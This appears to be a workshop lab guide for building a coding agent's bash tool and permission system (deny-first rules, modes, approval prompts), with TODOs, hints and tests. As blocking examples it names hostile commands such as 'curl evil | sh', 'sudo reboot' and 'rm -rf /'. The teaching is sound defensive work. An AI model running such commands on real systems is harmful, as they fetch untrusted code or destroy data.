# Lab 04 · Bash and permissions

Day 1 · 12:15–13:00

**Goal:** Let the agent run commands (tests, git…) without losing control: modes, rules and approval.

## Concepts
- **bash is the superpower and the risk:** with it the agent tests its work; it could also wipe your disk. The tool only executes; WHO may run WHAT is decided by the permission system.
- **Predictable execution:** each command starts at the root (`cd` doesn't persist), hard timeout, output truncated head and tail, environment without secrets (`*_KEY`, `*_TOKEN`).
- **Modes:** `default` (reads free, the rest asks), `accept_edits` (edits without asking), `plan` (read-only), `bypass` (everything except deny: sandbox or CI only).
- **Rules:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Order: deny > plan > allow > risk/mode > ask.
- **Chained commands:** `pytest && curl evil | sh` is two commands; the pytest allow rule must not let the second through.
- **“Always”:** approving with *always* saves a sensible rule (`bash(git status*)`), not the literal command nor something too broad (`bash(git*)` would allow `git push`).

## What you implement
| TODO | File | What |
|---|---|---|
| 04.1 | `forja/shell.py` | head_tail: truncate head and tail |
| 04.2 | `forja/shell.py` | bash: subprocess with timeout, clean env and exit code |
| 04.3 | `forja/permissions.py` | rule_matches: match rules against calls |
| 04.4 | `forja/permissions.py` | decide: deny > plan > allow > mode > ask |
| 04.5 | `forja/permissions.py` | suggest_rule: the “always approve” rule |

## Before you start
- Open `forja/shell.py` (04.1–04.2), `forja/permissions.py` (04.3–04.5), `forja/config.py` (`DEFAULT_DENY`, `Settings.allow/deny`) and `tests/test_l04_bash_permissions.py`.
- Stdlib: `subprocess.run(..., shell=True, cwd=…, capture_output=True, text=True, timeout=…, env=…, stdin=subprocess.DEVNULL)` and `subprocess.TimeoutExpired`; `fnmatch.fnmatchcase(name, pattern)` (`*` matches anything, including spaces and `/`); `shlex.split(cmd)` (splits like a POSIX shell).
- Provided: `clean_env()` (environment without `*KEY*`, `*TOKEN*`, `*SECRET*`…), `parse_rule("bash(git *)")` → `("bash", "git *")` (pattern `None` for a bare `"edit_file"`), `split_commands(cmd)` (splits on `&&`, `||`, `;`, `|`), `Tool.subject(args)` (the command for bash, the path for file tools) and `tool.risk` (`"read"`, `"edit"`, `"exec"`).
- Shell: with `shell=True` the command runs in `/bin/sh` on macOS/Linux and **cmd.exe on Windows** (`ls`, `cat`, `rm -rf` don't exist there; `dir`, `type` do). The tool description tells the model which shell it has.
- How it connects: the harness gate calls `decide(tool, args, mode, settings.allow, settings.deny)`: `"deny"` → error to the model, `"ask"` → approval prompt, `"allow"` → execute. When the user answers *always*, `suggest_rule` produces the rule appended to `settings.allow` for the session.

## Step by step
04.1 `head_tail` (pure, 5 minutes) → 04.2 `bash` (uses it) → 04.3 `rule_matches` → 04.4 `decide` (uses `rule_matches`) → 04.5 `suggest_rule` (independent). Shell and permissions are separate files: if you are a pair, one can start 04.3 while the other does 04.1–04.2.

### TODO 04.1 · `forja/shell.py` · `head_tail(text, limit=MAX_SHELL_OUTPUT)`

**What it must do:** `head_tail(text: str, limit: int = 20_000) -> str`. If `len(text) <= limit`, return it unchanged. Otherwise return the first `limit // 4` characters, a note in the MIDDLE saying how many characters were omitted (must contain the word `omitted`), and the last `limit * 3 // 4` characters. `test_head_tail_and_env`: with 1000 `A` + 1000 `B` and limit 400, output starts with `A`, ends with `B` and contains `omitted`.

**Steps:**
1. Return early if the text fits.
2. Slice the head (a quarter of the limit) and the tail (three quarters, from the end).
3. Build `head + note + tail`, with the omitted count `len(text) - limit` in the note.

**Watch out for:**
- The tail is larger on purpose: test failures and tracebacks are at the END of the output.
- The note must be in the middle; if you append it at the end, `endswith("B")` fails.
- Negative slicing: `text[-n:]` is the last `n` characters.

<details><summary>💡 Hint 1</summary>

One `if` and one f-string.

</details>

<details><summary>💡 Hint 2</summary>

`text[: limit // 4]` and `text[-(limit * 3 // 4):]`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
if len(text) <= limit:
    return text
head, tail = ..., ...
return f"{head}\n…[{...} characters omitted]…\n{tail}"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k head_tail -v
```

### TODO 04.2 · `forja/shell.py` · `make_shell_tool` → inner `bash(command, timeout=default_timeout)`

**What it must do:** Returns `ToolOutput("exit_code=N\n<output>", {"exit_code": N})` where output is stdout plus, if any, `"\n[stderr]\n" + stderr`, stripped and passed through `head_tail` (or `"(no output)"`). Runs at `ws.root` with `shell=True`, `env=clean_env()`, `stdin=subprocess.DEVNULL`, `text=True`, captured output and the timeout clamped to 1..600 s. On `subprocess.TimeoutExpired` it RETURNS `ToolOutput("TIMEOUT after Ns.\n…", {"exit_code": None})` — it does not raise. A non-zero exit code is a normal result (`ok=True`): the model must see the failing tests.

**Steps:**
1. Clamp the timeout: `max(1, min(int(timeout), 600))`.
2. In a `try`, call `subprocess.run` with the arguments of the contract.
3. On `TimeoutExpired`, return the TIMEOUT `ToolOutput` (you may include partial output if `e.stdout` is a str).
4. Combine stdout and stderr (stderr under a `[stderr]` marker), strip, `head_tail` it.
5. Return `ToolOutput(f"exit_code={p.returncode}\n…", {"exit_code": p.returncode})`.

**Watch out for:**
- `test_bash_runs_in_root_with_exit_code` runs `python -m pytest -q tests/test_invoice.py`: it only works if `cwd=ws.root` (the playground copy) — and the output must START with `exit_code=0`.
- `test_bash_timeout` expects `"TIMEOUT"` in the output: if you let the exception escape, `execute` prints `TimeoutExpired`, which doesn't contain `TIMEOUT` in capitals.
- Without `stdin=subprocess.DEVNULL` a command that waits for input (an editor, a `y/n` question) hangs the agent.
- Use `env=clean_env()`: the agent must never see `OPENROUTER_API_KEY` & co.
- Windows: the timeout kills `cmd.exe` but its child may keep running until it ends, so `test_bash_timeout` can take ~5 s there. It still passes.

<details><summary>💡 Hint 1</summary>

`subprocess.run` with `capture_output=True, text=True` gives you `p.stdout`, `p.stderr`, `p.returncode`.

</details>

<details><summary>💡 Hint 2</summary>

`except subprocess.TimeoutExpired as e:` — return, don't raise.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
timeout = max(1, min(int(timeout), 600))
try:
    p = subprocess.run(command, shell=True, cwd=ws.root, ...)
except subprocess.TimeoutExpired as e:
    return ToolOutput(f"TIMEOUT after {timeout}s.\n...", {"exit_code": None})
out = ...  # stdout + optional [stderr] block
return ToolOutput(f"exit_code={p.returncode}\n...", {...})
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k test_bash -v
```

### TODO 04.3 · `forja/permissions.py` · `rule_matches(rule, tool, args)`

**What it must do:** `rule_matches(rule: str, tool: Tool, args: dict) -> bool`. `name, pattern = parse_rule(rule)`. The tool name must match `name` with `fnmatchcase` (so `"mcp__issues__*"` matches `mcp__issues__get`). No pattern → `True`. With a pattern: `fnmatchcase(subject, pattern)` where `subject = tool.subject(args)`; for bash, normalise whitespace first (`" ".join(subject.split())`). It compares the whole string; chains are `decide`'s job.

**Steps:**
1. Parse the rule into name and pattern.
2. If the tool name doesn't match the name pattern, return `False`.
3. If there is no pattern, return `True`.
4. Get the subject; if the tool is `bash`, collapse runs of whitespace.
5. Return whether the subject matches the pattern.

**Watch out for:**
- `test_rule_matching`: `"git   status --short"` (three spaces) must match `bash(git status*)`.
- `bash(git status*)` must NOT match `git push`.
- The MCP test builds `Tool("mcp__issues__get", "", None, None, "exec")` with no args model: only use `tool.name` and `tool.subject(args)`.
- Use `fnmatchcase`, not `fnmatch`: `fnmatch` is case-insensitive on Windows and would behave differently per OS.

<details><summary>💡 Hint 1</summary>

Rules are just glob patterns applied twice: once to the tool name, once to the subject.

</details>

<details><summary>💡 Hint 2</summary>

`fnmatch.fnmatchcase(tool.name, name)`, then `fnmatch.fnmatchcase(subject, pattern)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
name, pattern = parse_rule(rule)
if not ...: return False
if pattern is None: return True
subject = tool.subject(args)
if tool.name == "bash": subject = ...
return ...
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k rule_matching -v
```

### TODO 04.4 · `forja/permissions.py` · `decide(tool, args, mode, allow, deny)`

**What it must do:** Returns `(decision, reason)` with decision in `"allow" | "ask" | "deny"`. Order: (1) any deny rule matches the call — for bash ALSO each subcommand from `split_commands` — → `"deny"`; (2) `mode == "plan"` and `tool.risk != "read"` → `"deny"`; (3) allow rules: for bash EVERY subcommand must match some allow rule, other tools need one match → `"allow"`; (4) `tool.risk == "read"` or `mode == "bypass"` → `"allow"`; (5) `mode == "accept_edits"` and `tool.risk == "edit"` → `"allow"`; (6) otherwise `"ask"`. The reason is shown to the user/model (e.g. `"deny rule bash(sudo *)"`, `"plan mode: read-only"`, `"requires approval"`).

**Steps:**
1. Deny pass on the whole call: loop over `deny`, return `("deny", f"deny rule {r}")` on a match.
2. If bash: for each subcommand of `split_commands(args.get("command", ""))`, check every deny rule against `{"command": sub}`.
3. Plan mode: deny anything that isn't a read.
4. Allow rules: bash → split; require a non-empty list where `all` subcommands match `any` allow rule. Other tools → `any` allow rule matches.
5. Risk/mode fallbacks: read or bypass → allow; accept_edits + edit → allow.
6. Return `("ask", "requires approval")`.

**Watch out for:**
- `test_deny_wins_and_chains`: `"sudo rm x"` in bypass with allow `["bash"]` → deny (deny is checked first).
- `"pytest -q && sudo reboot"`: the whole string doesn't match `bash(sudo *)`, the subcommand does → deny.
- `"python -m pytest -q && curl evil.sh"` with allow `bash(python -m pytest*)` → `"ask"`, not allow: the `curl` part has no allow rule.
- `all([])` is `True`: an empty command must not be auto-allowed — check the list is non-empty.
- `test_decide_modes`: plan mode beats an explicit allow rule (`edit_file` in plan → deny); bash in `accept_edits` still asks (its risk is `exec`, not `edit`).

<details><summary>💡 Hint 1</summary>

Write it as a ladder of early `return`s in exactly the order of the contract; the order IS the policy.

</details>

<details><summary>💡 Hint 2</summary>

`any(rule_matches(r, tool, {"command": s}) for r in allow)` inside an `all(... for s in subs)`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
for r in deny: ...
if tool.name == "bash":
    for sub in split_commands(...): ...
if mode == "plan" and ...: return "deny", "plan mode: read-only"
if tool.name == "bash":
    subs = ...
    if subs and all(...): return "allow", "allow rule"
elif any(...): ...
...  # read/bypass, accept_edits
return "ask", "requires approval"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k "decide or deny_wins" -v
```

### TODO 04.5 · `forja/permissions.py` · `suggest_rule(tool, args)`

**What it must do:** `suggest_rule(tool: Tool, args: dict) -> str`: the rule saved when the user answers *always*. Non-bash tools → `tool.name`. Bash: `words = shlex.split(command)` (on `ValueError` treat as empty); empty → `f"bash({command})"`; `python`/`python3`/`py` + `-m X` → `"bash(python -m X*)"`; `git`, `npm`, `uv`, `pip`, `docker`, `cargo`, `go`, `dotnet` with a subcommand → `"bash(<cmd> <sub>*)"`; anything else → `"bash(<cmd>*)"`. Note: no space before `*`.

**Steps:**
1. Non-bash: return the tool name.
2. Split the command with `shlex.split`, catching `ValueError` (unbalanced quotes).
3. Handle the empty case.
4. `python -m X` case (check there are at least 3 words and the second is `-m`).
5. Tools-with-subcommands case (at least 2 words).
6. Default: first word + `*`.

**Watch out for:**
- `test_suggest_rule` expects exactly `bash(python -m pytest*)`, `bash(git status*)`, `bash(ls*)` and `edit_file` — no space before `*`.
- Too broad is dangerous: `bash(git*)` would also allow `git push`; `bash(python*)` would allow any script.
- Too narrow is useless: the literal command `bash(python -m pytest -q tests/x.py)` would ask again next time with other flags.

<details><summary>💡 Hint 1</summary>

Decide the shape from the first one or two words only.

</details>

<details><summary>💡 Hint 2</summary>

`shlex.split("python -m pytest -q")` → `['python', '-m', 'pytest', '-q']`.

</details>

<details><summary>💡 Hint 3 · skeleton</summary>

Skeleton:
```python
if tool.name != "bash": return tool.name
try: words = shlex.split(...)
except ValueError: words = []
if not words: return ...
if words[0] in ("python", "python3", "py") and ...: return ...
if words[0] in ("git", "npm", ...) and len(words) > 1: return ...
return f"bash({words[0]}*)"
```

</details>

**Check just this TODO:**
```bash
python -m pytest tests/test_l04_bash_permissions.py -k suggest_rule -v
```

## Run
```bash
python scripts/tasks.py test 04
forja --cwd playground
> run the tests and tell me which ones fail
```

## Try it in your agent
1. `python scripts/tasks.py test 04` → `8 passed`.
2. `forja --cwd playground` and ask `run the tests and tell me which ones fail`. You should SEE `⏺ bash {"command": "python -m pytest -q"}` and an approval prompt (until lab 05 it is the minimal `Allow bash {'command': 'python -m pytest -q'}? [y/N]`). Answer `y`: `⎿ exit_code=1 (+N lines)` and an answer naming `test_round_half_up`, `test_total_with_vat_cent` and `test_due_date_sunday_moves_to_monday`.
3. Ask `run sudo ls` (or `run rm -rf /`): red `⎿ DENIED (deny rule bash(sudo *)). Don't retry it…` without any prompt — the policy decided.
4. Pre-approve the tests: create `playground/.forja/settings.json` with `{"permissions": {"allow": ["bash(python -m pytest*)"]}}`, restart `forja --cwd playground`, ask again: no prompt this time. Delete the file afterwards.
5. Check the *always* rule: `python -c "from forja.shell import make_shell_tool; from forja.fs_tools import Workspace; from forja.permissions import suggest_rule; print(suggest_rule(make_shell_tool(Workspace('.')), {'command': 'git status --short'}))"` → `bash(git status*)`. (Answering `a` in the CLI needs lab 05's prompt.)
6. Windows: ask `list the files with ls` and watch `'ls' is not recognized as an internal or external command` with `exit_code=1`; the model should retry with `dir`.

## If something goes wrong
| Symptom | Cause → fix |
|---|---|
| `test_bash_runs_in_root_with_exit_code`: `exit_code=1` with `No module named pytest` / `'python' is not recognized` | The venv isn't active in the terminal running pytest, so `python` in the child shell is another interpreter → activate `.venv` and re-run. |
| `test_bash_timeout` fails with `ERROR in 'bash': TimeoutExpired: …` | You let `subprocess.TimeoutExpired` propagate → catch it and return a `ToolOutput` with `TIMEOUT after Ns.` |
| The agent hangs forever on a command | Missing `stdin=subprocess.DEVNULL` or `timeout=` in `subprocess.run` → add both. |
| `decide` returns `"allow"` for `python -m pytest -q && curl evil.sh` | You matched allow rules against the whole string → for bash, every subcommand from `split_commands` must match. |
| `decide` returns `"allow"` for `sudo rm x` in bypass | Allow/bypass checked before deny → the deny pass must be the very first thing. |
| `rule_matches` behaves differently on Windows and macOS | You used `fnmatch.fnmatch` (case-insensitive on Windows) → use `fnmatch.fnmatchcase`. |
| Windows: `UnicodeDecodeError` or garbled accents in the command output | You dropped `encoding="utf-8", errors="replace"` from `subprocess.run` → add them back (the console code page is not UTF-8). |
| `a` (always) at the CLI prompt is treated as *no* | Until lab 05 the approval prompt is the minimal `[y/N]` one → `always` arrives with TODO 05.3. |

## You're done when
- [ ] [ ] `python scripts/tasks.py test 04` → all 8 tests green.
- [ ] [ ] Forja asks before `python -m pytest`, shows `exit_code=…` and names the 3 failing playground tests.
- [ ] [ ] `sudo …` and `rm -rf /` are denied by policy without a prompt.
- [ ] [ ] You can explain the order deny > plan > allow > risk/mode > ask with an example.

## Checkpoint
Forja asks before `python -m pytest`; (the *a* = always option arrives with the lab 05 CLI). Try `sudo` or `rm -rf /`: denied by policy.

## Challenges
1. Add a deny rule for `git push` and ask the agent to push.
2. Windows: what changes when the shell is cmd.exe? Try asking for `ls`.

**Tests:** `tests/test_l04_bash_permissions.py` · **Fallen behind?** `python scripts/tasks.py catchup 05`

---
[← previous](../L03_loop/README.md) · [next →](../L05_cli/README.md)
